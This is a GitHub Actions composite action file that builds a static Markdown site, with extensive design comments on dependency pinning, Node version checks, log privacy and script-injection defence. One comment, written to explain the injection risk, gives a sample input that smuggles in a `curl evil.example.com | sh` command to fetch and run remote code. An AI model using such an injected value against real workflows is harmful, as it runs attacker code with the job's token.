# The action a stranger adds to their own notes repository.
#
# This is NOT `.github/workflows/verify.yml`, which is this repository's own CI
# and runs this repository's own gates. This file is a *composite action*: it has
# no triggers and never runs on its own, and it exists to be named by somebody
# else's workflow as
#
#     - uses: <owner>/<repo>@v1
#
# It builds the site and stops. It does not deploy, does not push, and does not
# write anything into the user's repository — the deploy step belongs to the
# user's own workflow, where they can see it, and `docs/adoption.md` shows it.
#
# ## How the generator gets here today, and where its name lives
#
# `package.json` carries `"private": true`, so this package is on no registry and
# `npx` resolves nothing for it. **It will be published, but under a different
# name than it has now** — the rename is the owner's and has not happened. So
# this action is built to need neither: it depends on no registry today, and the
# rename must be a single edit rather than a search.
#
# **What makes that work is a property of `uses:` rather than a workaround.**
# When a workflow names an action by repository, the runner checks that whole
# repository out at `$GITHUB_ACTION_PATH` before the first step runs. This file
# sits at the root of the generator's own repository, so the generator's complete
# source — `bin/`, `scripts/`, `src/`, `astro.config.mjs` — is already on disk
# next to it, at the exact commit the user's `@v1` resolves to. Nothing needs
# fetching from a registry, and the version pin plan §5.3 asks for is the git ref
# the user wrote, which is one pin rather than two.
#
# The `.ts` sources run directly: Node strips types from a plain checkout, and
# refuses to only under `node_modules` — which is why the tarball is compiled and
# why this path does not have to be. Measured end to end on a foreign notes
# directory from a `git archive` checkout of this repository: `4 discovered,
# 2 published, 2 dropped`, a complete site, with the configured exclusion honoured.
#
# **The package name appears nowhere in this file, and that is the design.** The
# binary is located by reading `package.json`'s `bin` key out of the checkout
# rather than by writing its filename here — that key is the one place a package
# name and its entry point are tied together, so a rename touches the manifest
# and nothing else. `tests/adoption.test.ts` holds the property by reading the
# name from the manifest and asserting it is absent here, which keeps working
# through the rename rather than pinning the name it exists to remove.
#
# **On the day it is published**, the install step below is deleted and the build
# step's `run:` becomes `npx <the-published-name>@<version> build …`. That is the
# first time this file would carry the name, and it is one line. Until then the
# name a user types is the repository in their own `uses:` line, which is a git
# coordinate and not a package name — so adoption today survives the rename,
# while adoption *after* publishing does not: a user's committed workflow would
# name the old package. Whoever writes the release process owns that ordering.
#
# ## What this may print
#
# A public notes repository's workflow log is world-readable and retained for 90
# days, so a withheld note's path — or merely its basename — is an index to it.
# Every line this file composes is a literal written here; the counts come from
# the binary, which composes its own lines under the same rule and puts the names
# in a report under the git directory that no `git add` can reach.
#
# The commands that are not ours are `git rev-parse`, which answers `true` or
# `false`, and the two installers, both at `--loglevel=error`. What each prints
# there was measured rather than assumed, because they differ: `pnpm install`
# prints nothing at all on success, while `npm install -g` still prints one line
# of the form `added 1 package in 2s` — a count and a duration, naming nothing.
# On failure both report, and their output carries paths into the *action's*
# dependency tree on the runner — never the user's notes, which neither installer
# reads. A dependency install that failed silently would be the worse trade.

name: Publish a site from a directory of Markdown
description: >-
  Builds a static site — prerendered pages, full-text search, backlinks — from
  the Markdown in this repository. Publishes everything except what you exclude.

inputs:
  content-dir:
    description: The directory holding the Markdown, relative to the repository root.
    required: false
    default: .
  out-dir:
    description: Where to write the site. Replaced wholesale on every build.
    required: false
    default: dist

# Three inputs the plan's §5.1 names are deliberately absent, because each would
# be a second way to say something this tool already has one way to say:
#
# - `config`, a path to the configuration file. `scripts/load-config.ts` has one
#   filename and no search order, on the stated reasoning that a search order is
#   a place for a file to be silently not found — and it refuses a near-miss
#   spelling by name rather than accepting it. An input redirecting it would
#   reintroduce exactly that, in YAML, where the loader's refusal cannot reach.
# - `generator-version`. The generator is this checkout, so its version is the
#   ref the user wrote in `uses:`. A second pin can disagree with the first.
# - `fail-on-new`, which gates a published-slug addition against a committed
#   publish manifest. **No manifest exists anywhere in this tree.** An input
#   whose behaviour is unimplemented is worse than an absent one: a user reading
#   the table would believe the acknowledgement step is protecting them.

runs:
  using: composite
  steps:
    # First, because it is the one failure that produces a *valid-looking wrong
    # site* rather than an error. `actions/checkout` defaults to `fetch-depth: 1`,
    # so this fires for anyone who has not set `fetch-depth: 0` — which is the
    # point: it makes the documented setting non-optional rather than advisory.
    #
    # Stated honestly, because a reader will otherwise assume it is load-bearing
    # today: **the producer derives no dates from git at present.** `created` and
    # `updated` are unset, so a shallow clone currently costs nothing. This check
    # is here for the commit that changes that, since the alternative is somebody
    # remembering to add it on the day it starts mattering, and the failure it
    # guards against is silent.
    - name: Refuse a shallow clone
      shell: bash
      run: |
        if [ "$(git rev-parse --is-shallow-repository)" = "true" ]; then
          echo "::error::This repository was cloned shallowly, so commit dates are unavailable." >&2
          echo "Add fetch-depth: 0 to the actions/checkout step in this workflow:" >&2
          echo "" >&2
          echo "      - uses: actions/checkout@v5" >&2
          echo "        with:" >&2
          echo "          fetch-depth: 0" >&2
          exit 1
        fi

    # Node's version is checked rather than installed, and the floor is read from
    # the generator's own `engines` rather than written here — a literal here
    # would be a third pin, after `engines` and `.nvmrc`, and the three would
    # drift. A runner's default Node is whatever the image ships; below the floor
    # the failure is otherwise a syntax error inside a dependency, which tells a
    # stranger nothing about what to change.
    - name: Check the Node version
      shell: bash
      run: |
        node -e '
          const { readFileSync } = require("node:fs");
          const manifest = JSON.parse(readFileSync(process.env.GITHUB_ACTION_PATH + "/package.json", "utf8"));
          const floor = /^>=\s*(\d+)\.(\d+)\.(\d+)/.exec(manifest.engines.node);
          if (!floor) throw new Error("the generator declares no engines.node floor");
          const wanted = floor.slice(1).map(Number);
          const found = process.versions.node.split(".").map(Number);
          for (let i = 0; i < 3; i += 1) {
            if (found[i] > wanted[i]) break;
            if (found[i] < wanted[i]) {
              console.error("::error::Node " + process.versions.node + " is too old to build this site; " +
                manifest.engines.node + " is required.");
              console.error("Add a setup-node step before this action:");
              console.error("");
              console.error("      - uses: actions/setup-node@v5");
              console.error("        with:");
              console.error("          node-version: 24");
              process.exit(1);
            }
          }
        '

    # **pnpm, against the lockfile that is already here.** This step used to run
    # `npm install --omit=dev`, and the defect it left open was written up in this
    # comment rather than fixed: `npm install` ignores `pnpm-lock.yaml` and
    # resolves the caret ranges in `package.json` fresh, so a dependency's new
    # minor reached a user's build with no diff in their repository. The generator
    # was pinned exactly by the ref in `uses:` and its dependency tree was not, so
    # two builds of the same commit could differ. For a tool whose output is a
    # published website that is a supply-chain hole, and a comment is not a fix.
    #
    # **The old comment's premise was false when it was written, not merely
    # out of date.** It said closing this "means committing a `package-lock.json`
    # for a repository that installs with pnpm, which is a second lockfile and its
    # own drift", and left a P0 open on that cost. There was no such cost. The
    # runner checks out the generator's *whole repository* at
    # `$GITHUB_ACTION_PATH`, so `pnpm-lock.yaml` — every one of its 553 resolved
    # entries, each with an integrity hash — was already on disk beside this file,
    # at the exact commit the user's ref names. The complete pin was being shipped
    # to the runner and thrown away by the installer. Nothing had to be committed
    # and no second lockfile had to be invented; the paragraph reasoned about what
    # would have to be *added* and never checked what was already there.
    #
    # `--frozen-lockfile` is what stops it being thrown away, and it *refuses*
    # rather than resolving if the lockfile and `package.json` have drifted apart
    # — so a stale lockfile is a loud failure rather than a silent fresh
    # resolution. It is also a strictly stronger pin than rewriting the direct
    # dependencies, which is what the publish path has to settle for: the lockfile
    # covers the transitive tree, all 553 entries, and not merely the 11 this
    # manifest names.
    #
    # `pnpm/action-setup` is still not available — not for the `package-json-file`
    # reason the old comment gave, but because a composite action calling another
    # action is what `tests/adoption.test.ts` forbids outright, since anything it
    # calls may deploy. Corepack, the other obvious route, is worse than
    # unavailable: it is **excluded from Node from 25.0.0** (nodejs/corepack
    # README), so building on it would be building on something already leaving.
    # So pnpm is installed by npm, at the version `packageManager` already pins —
    # read out of the manifest rather than written here, because a literal would
    # be a second pin that drifts from the first.
    #
    # Two properties come along with pnpm that npm never gave this step. The
    # checkout also carries `pnpm-workspace.yaml`, whose `allowBuilds` is an
    # approval list for install scripts, so a new dependency cannot begin running
    # one unnoticed in a stranger's CI. And `--prod` omits the gates, measured:
    # `astro`, `pagefind` and `yaml` present, `vitest`, `typescript` and
    # `@astrojs/check` absent, and the build runs.
    #
    # **What `allowBuilds` costs, named rather than sold as free.** A package in
    # neither direction of that list is unreviewed and *fails* the install, so
    # adding a dependency whose install script matters breaks every user's build
    # until this repository approves it — and the message tells a stranger to run
    # `pnpm approve-builds` in a repository they do not own and cannot fix. That
    # is the right default for a tool that publishes websites, since the
    # alternative is an unreviewed postinstall running in every adopter's CI, but
    # the failure lands on the adopter and the fix is only ever available here.
    #
    # `--loglevel=error` because pnpm's default reporter prints the runner's
    # content-addressable store path. That is a path into the *action's* own
    # dependency tree and never the user's notes, but a world-readable log has no
    # use for it.
    #
    # **The pnpm version reaches npm through the environment, not through a
    # command substitution**, and the reason is a gate rather than taste:
    # `tests/adoption.test.ts` refuses any expansion in a `run:` body that is not
    # on a closed allowlist, because command substitution is how a directory
    # listing reaches a world-readable log. Writing `npm install -g "$(node -p
    # …)"` would have meant widening that allowlist to admit a second `node -p`,
    # which is the wrong direction for a rule whose whole value is that it is
    # closed. `$GITHUB_ENV` is GitHub's own mechanism for passing a value between
    # steps, and `$PNPM_SPEC` is then an ordinary variable reference.
    #
    # **It is a separate step because `$GITHUB_ENV` only reaches _later_ steps.**
    # A variable written to that file during a step is not in the environment of
    # the same step — so a single step would run `npm install -g ""`, which is
    # not an error npm reports usefully. Split, the value is set here and read
    # below.
    #
    # The `+sha512.…` tail `packageManager` may carry is stripped: it is
    # corepack's integrity hash, not part of an npm specifier, and a spec of the
    # form `pnpm@<version>+sha512.…` fails on it. The version itself is
    # deliberately not written anywhere in this file — `tests/pinning.test.ts`
    # forbids it, including in a comment, because a second spelling is the drift
    # the derivation exists to remove.
    - name: Read the pinned pnpm version
      shell: bash
      run: |
        node -e '
          const { readFileSync, appendFileSync } = require("node:fs");
          const manifest = JSON.parse(readFileSync(process.env.GITHUB_ACTION_PATH + "/package.json", "utf8"));
          const declared = manifest.packageManager;
          if (typeof declared !== "string") throw new Error("the generator declares no packageManager");
          appendFileSync(process.env.GITHUB_ENV, "PNPM_SPEC=" + declared.split("+")[0] + "\n");
        '

    - name: Install the generator's dependencies
      shell: bash
      working-directory: ${{ github.action_path }}
      run: |
        npm install -g "$PNPM_SPEC" --loglevel=error
        pnpm install --frozen-lockfile --prod --loglevel=error

    # The one step that reads the user's notes. Every path here is the user's own
    # input echoed back into an argument, never into the log: the binary prints
    # counts, and the two directories are quoted so one with a space in it stays
    # one argument.
    #
    # **The binary is located through `package.json`'s `bin` key rather than by
    # its filename.** That key is the one place a package's name and its entry
    # point are tied together, and this package is going to be renamed before it
    # is published — so a filename written here would be a second place the
    # rename has to find. `node -p` reads it out of the manifest that ships
    # beside this file in the same checkout. The value is a literal of the
    # generator's own manifest, not user input, so it is not the injection class
    # the paragraph below is about.
    #
    # **The inputs reach the shell through `env:`, never through `${{ }}` inside
    # `run:`.** An expression interpolated into a script is substituted as *text*
    # before bash parses it, so a `content-dir` of `.; curl evil.example.com | sh`
    # is not a directory that fails to exist — it is a second command, running
    # with whatever the job's token can do. It is the standard GitHub Actions
    # injection, and the fact that this input usually comes from the user's own
    # workflow file is not a defence: `content-dir: ${{ github.event.inputs.dir }}`
    # is a plausible thing for a user to write on a `workflow_dispatch`, and then
    # the value is a stranger's. An environment variable is passed as data and is
    # never parsed as script.
    #
    # `working-directory` is the workspace rather than the action path, because
    # `build` resolves a relative `--content` and `--out` against the directory it
    # was run in, and reads `publish.config.yaml` from the content directory.
    - name: Build the site
      shell: bash
      working-directory: ${{ github.workspace }}
      env:
        PUBLISH_CONTENT_DIR: ${{ inputs.content-dir }}
        PUBLISH_OUT_DIR: ${{ inputs.out-dir }}
      run: |
        entry="$(node -p 'const m=require(process.env.GITHUB_ACTION_PATH+"/package.json"); Object.values(m.bin)[0]')"
        node "$GITHUB_ACTION_PATH/$entry" build --content "$PUBLISH_CONTENT_DIR" --out "$PUBLISH_OUT_DIR"
